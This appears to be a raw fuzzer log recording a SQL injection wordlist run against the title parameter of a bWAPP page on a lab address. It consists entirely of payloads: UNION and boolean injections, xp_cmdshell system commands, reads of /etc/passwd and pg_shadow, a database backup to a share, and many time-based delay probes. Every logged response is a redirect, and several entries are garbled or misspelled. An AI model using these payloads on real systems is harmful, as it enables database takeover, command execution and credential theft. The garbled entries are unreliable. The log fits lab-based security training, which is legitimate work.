35,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1%20and%20user_name()%20=%20'dbo'
36,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=\';%20desc%20users;%20--
37,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1\'1
38,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1'%20and%20non_existant_table%20=%20'1
40,302,0L,0W,"%20116>http://10.0.2.4/bWAPP/sqli_1.php?title=1%20and%20ascii(lower(substring((select%20top%201%20name%20from%20sysobjects%20where%20xtype='u'),%201,%201)))%20>%20116"
41,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=1%20union%20all%20select%201,2,3,4,5,6,name%20from%20sysobjects%20where%20xtype%20=%20'u'%20--"
42,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=1%20uni/**/on%20select%20all%20from%20where
39,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20or%20username%20is%20not%20NULL%20or%20username%20=%20'
43,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
44,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20@@version
45,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20@@servernamee
46,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20@@microsoftversione
47,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20*%20from%20master..sysserverse
48,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20*%20from%20sysusers
49,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=exec%20master..xp_cmdshell%20'ipconfig+/all'
50,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=exec%20master..xp_cmdshell%20'net+view'
51,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=exec%20master..xp_cmdshell%20'net+users'
52,302,0L,0W,'>http://10.0.2.4/bWAPP/sqli_1.php?title=exec%20master..xp_cmdshell%20'ping+'
53,302,0L,0W,\\backupdb.dat'>http://10.0.2.4/bWAPP/sqli_1.php?title=BACKUP%20database%20master%20to%20disks='\\\\backupdb.dat'
54,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=create%20table%20myfile%20(line%20varchar(8000))""%20bulk%20insert%20foo%20from%20'c:\inetpub\wwwroot\auth.aspâ'""%20select%20*%20from%20myfile""--"
55,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
56,302,0L,0W,'%20OR%201=1-->http://10.0.2.4/bWAPP/sqli_1.php?title='%20OR%201=1--
58,302,0L,0W,'-->http://10.0.2.4/bWAPP/sqli_1.php?title='--
57,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='OR%20''%20=%20' Allows%20authentication%20without%20a%20valid%20username.
59,302,0L,0W,"',%20''%201-->http://10.0.2.4/bWAPP/sqli_1.php?title='%20union%20select%201,%20'',%20''%201--"
60,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='OR%201=1--
61,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
62,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20version();
63,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_database();
64,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_user;
66,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('log_connections');
65,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20session_user;
68,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('port');
67,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('log_statement');
69,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('password_encryption');
70,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('krb_server_keyfile');
71,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('virtual_host');
72,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('port');
73,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('config_file');
74,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('hba_file');
76,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20*%20from%20pg_shadow;
75,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20current_setting('data_directory');
77,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20*%20from%20pg_group;
78,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=create%20table%20myfile%20(input%20TEXT);
80,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=select%20*%20from%20myfile;copy%20myfile%20to%20/tmp/test;
79,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=copy%20myfile%20from%20'/etc/passwd';
81,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
84,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')%20waitfor%20delay%20'0:0:20'%20/*
82,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)%20waitfor%20delay%20'0:0:20'%20/*
83,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=)%20waitfor%20delay%20'0:0:20'%20--
86,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")%20waitfor%20delay%20'0:0:20'%20/*"
85,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')%20waitfor%20delay%20'0:0:20'%20--
87,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")%20waitfor%20delay%20'0:0:20'%20--"
89,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))%20waitfor%20delay%20'0:0:20'%20--
88,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=))%20waitfor%20delay%20'0:0:20'%20/*
90,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))%20waitfor%20delay%20'0:0:20'%20/*
91,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))%20waitfor%20delay%20'0:0:20'%20--
93,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))%20waitfor%20delay%20'0:0:20'%20--"
94,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
92,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))%20waitfor%20delay%20'0:0:20'%20/*"
96,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL)%20waifor%20delay%20'0:0:20'%20/*"
95,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL)%20waitfor%20delay%20'0:0:20'%20--"
100,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL)%20waitfor%20delay%20'0:0:20'%20/*"
99,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL)%20waitfor%20delay%20'0:0:20'%20--"
98,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL)%20waitfor%20delay%20'0:0:20'%20/*"
101,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL)%20waitfor%20delay%20'0:0:20'%20--"
102,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL)%20waifor%20delay%20'0:0:20'%20/*"
97,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL)%20waitfor%20delay%20'0:0:20'%20--"
104,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL)%20waitfor%20delay%20'0:0:20'%20/*"
103,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL)%20waitfor%20delay%20'0:0:20'%20--"
106,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
105,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL)%20waitfor%20delay%20'0:0:20'%20--"
108,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
110,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
107,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
109,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
111,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
112,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
113,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
114,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
117,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
115,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
116,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
118,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
122,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
121,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
119,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
126,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
120,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
124,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
127,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
128,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
123,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
125,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
131,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
130,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
129,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
132,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
133,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
135,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
137,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
134,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
136,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
138,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
139,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
140,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
142,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
141,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
143,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
144,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
148,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
145,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
146,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
149,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
147,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
151,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
150,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
152,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
154,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
153,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
155,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
156,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
157,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
158,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
159,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
161,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
163,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
162,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
160,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
167,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
164,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
165,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
168,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
166,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
169,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
172,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
170,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
171,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
174,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
173,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
175,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
176,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
177,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
179,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
181,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
184,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
183,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
180,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
178,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
182,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
189,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
190,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=waitfor%20delay%20'0:0:20'%20/*
185,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
192,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20waitfor%20delay%20'0:0:20'%20/*
186,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
187,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*"
191,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=waitfor%20delay%20'0:0:20'%20--
188,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
195,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""%20waitfor%20delay%20'0:0:20'%20--"
193,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20waitfor%20delay%20'0:0:20'%20--
